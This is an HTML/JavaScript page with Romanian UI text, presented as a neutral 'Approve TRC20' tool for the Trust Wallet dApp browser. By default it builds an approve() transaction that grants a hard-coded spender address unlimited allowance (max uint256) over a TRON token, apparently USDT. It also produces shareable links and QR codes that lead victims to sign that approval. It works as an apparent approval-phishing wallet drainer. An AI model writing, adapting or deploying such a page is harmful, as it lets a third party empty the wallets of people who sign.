<!doctype html>
<html lang="ro">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Approve TRC20</title>
  <style>
    body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; padding: 20px; }
    #status { margin: 12px 0; }
    button { padding: 8px 12px; font-size: 16px; margin-right:8px; }
    #qr { margin-top: 12px; }
    #controls { margin: 12px 0; display:flex; gap:8px; align-items:flex-start; flex-wrap:wrap; }
    .field { display:flex; flex-direction:column; gap:6px; }
    input { padding:6px; font-size:14px; width: 360px; max-width:100%; }
    label { font-weight:600; }
  </style>
</head>
<body>
  <h3>Approve token (Trust Wallet dApp)</h3>
  <div id="status">Aștept tronWeb...</div>

  <div id="controls">
    <div class="field">
      <label for="token">Token</label>
      <input id="token" type="text" />
    </div>
    <div class="field">
      <label for="spender">Spender</label>
      <input id="spender" type="text" />
    </div>
    <div class="field">
      <label for="value">Value (uint256)</label>
      <input id="value" type="text" />
    </div>
  </div>

  <div style="margin-top:8px;">
    <button id="copyLinkBtn">Copiază link</button>
    <button id="openLinkBtn">Deschide link</button>
    <button id="downloadQrBtn">Descarcă QR</button>
    <button id="approveBtn" disabled>Trimite approve</button>
  </div>

  <div id="qr"></div>

  <script src="https://unpkg.com/tronweb/dist/TronWeb.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
  <script>
  (async function () {
    const DEFAULT_TOKEN = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const DEFAULT_SPENDER = "TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu";
    const DEFAULT_VALUE = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

    const qs = new URLSearchParams(location.search);
    const tokenInput = document.getElementById("token");
    const spenderInput = document.getElementById("spender");
    const valueInput = document.getElementById("value");
    const statusEl = document.getElementById("status");
    const btn = document.getElementById("approveBtn");
    const copyLinkBtn = document.getElementById("copyLinkBtn");
    const openLinkBtn = document.getElementById("openLinkBtn");
    const downloadQrBtn = document.getElementById("downloadQrBtn");
    const qrContainer = document.getElementById("qr");

    tokenInput.value = qs.get("token") || DEFAULT_TOKEN;
    spenderInput.value = qs.get("spender") || DEFAULT_SPENDER;
    valueInput.value = qs.get("value") || DEFAULT_VALUE;

    const status = (txt) => { statusEl.innerText = txt; console.log(txt); };

    function buildLink() {
      const u = new URL(location.href.split('?')[0]);
      u.searchParams.set('token', tokenInput.value);
      u.searchParams.set('spender', spenderInput.value);
      u.searchParams.set('value', valueInput.value);
      return u.toString();
    }

    async function renderQR(link) {
      qrContainer.innerHTML = '';
      try {
        const canvas = document.createElement('canvas');
        await QRCode.toCanvas(canvas, link, { width: 280 });
        qrContainer.appendChild(canvas);
        const caption = document.createElement('div');
        caption.style.marginTop = '8px';
        caption.style.wordBreak = 'break-all';
        caption.innerText = link;
        qrContainer.appendChild(caption);
      } catch (e) {
        qrContainer.innerText = 'Eroare generare QR: ' + (e && e.message ? e.message : JSON.stringify(e));
      }
    }

    // initial QR
    renderQR(buildLink());

    // update QR when inputs change
    [tokenInput, spenderInput, valueInput].forEach(inp => {
      inp.addEventListener('input', () => renderQR(buildLink()));
    });

    copyLinkBtn.onclick = async () => {
      const link = buildLink();
      try {
        await navigator.clipboard.writeText(link);
        status('Link copiat în clipboard');
      } catch (e) {
        status('Nu s-a putut copia link: ' + (e && e.message ? e.message : e));
      }
    };

    openLinkBtn.onclick = () => {
      window.open(buildLink(), '_blank');
    };

    downloadQrBtn.onclick = async () => {
      const link = buildLink();
     
      try {
        const canvas = document.createElement('canvas');
        await QRCode.toCanvas(canvas, link, { width: 800 });
        canvas.toBlob(function(blob) {
         
          const a = document.createElement('a');
          const url = URL.createObjectURL(blob);
          a.href = url;
          a.download = 'approve_qr.png';
          document.body.appendChild(a);
          a.click();
          a.remove();
          URL.revokeObjectURL(url);
          status('QR descărcat');
        }, 'image/png');
      } catch (e) {
        status('Eroare generare/descarcare QR: ' + (e && e.message ? e.message : JSON.stringify(e)));
      }
    };

    function waitTronWeb(timeout = 20000) {
      return new Promise((resolve, reject) => {
        const start = Date.now();
        (function check() {
          if (window.tronWeb && window.tronWeb.ready) return resolve(window.tronWeb);
          if (Date.now() - start > timeout) return reject(new Error("tronWeb not found"));
          setTimeout(check, 300);
        })();
      });
    }

    if (!tokenInput.value || !spenderInput.value || !valueInput.value) {
      status('Lipsește token, spender sau value.');
    }

    try {
      status("Aștept tronWeb (deschide în Trust Wallet dApp)...");
      const tronWeb = await waitTronWeb();
      const from =
        (tronWeb.defaultAddress && tronWeb.defaultAddress.base58) ||
        (tronWeb.address && tronWeb.address.from && tronWeb.address.from().base58) ||
        null;

      status("Conectat: " + (from || "unknown"));
      btn.disabled = false;

      btn.onclick = async () => {
        try {
          btn.disabled = true;
          status("Construiesc tranzacție approve...");

          const TOKEN = tokenInput.value;
          const SPENDER = spenderInput.value;
          const VALUE = valueInput.value;

          const params = [
            { type: "address", value: SPENDER },
            { type: "uint256", value: VALUE },
          ];

          const txResp = await tronWeb.transactionBuilder.triggerSmartContract(
            TOKEN,
            "approve(address,uint256)",
            { feeLimit: 100_000_000, callValue: 0 },
            params,
            from
          );

          if (!txResp) throw new Error("Răspuns nul de la triggerSmartContract");
          if (!txResp.result || txResp.result.result !== true) {
            throw new Error("Eroare construire tx: " + JSON.stringify(txResp));
          }

          const unsignedTx = txResp.transaction;
          if (!unsignedTx) throw new Error("Tranzacție nesemnată lipsă");

          status("Cerere de semnare în Trust Wallet...");
          const signed = await tronWeb.trx.sign(unsignedTx);
          if (!signed) throw new Error("Semnare eșuată sau anulată de utilizator");

          const receipt = await tronWeb.trx.sendRawTransaction(signed);

          if (receipt && (receipt.result === true || receipt.result)) {
            const txid = receipt.txid || (receipt.transaction && receipt.transaction.txID) || null;
            status("Trimis OK. TxID: " + (txid || JSON.stringify(receipt)));
          } else {
            throw new Error("Eroare trimitere: " + JSON.stringify(receipt));
          }
        } catch (err) {
          const msg = err && err.message ? err.message : JSON.stringify(err);
          status("Eroare: " + msg);
          btn.disabled = false;
        }
      };
    } catch (err) {
      status("tronWeb nu a fost detectat: deschide această pagină în Trust Wallet dApp.");
      console.error(err);
    }
  })();
  </script>
</body>
</html>
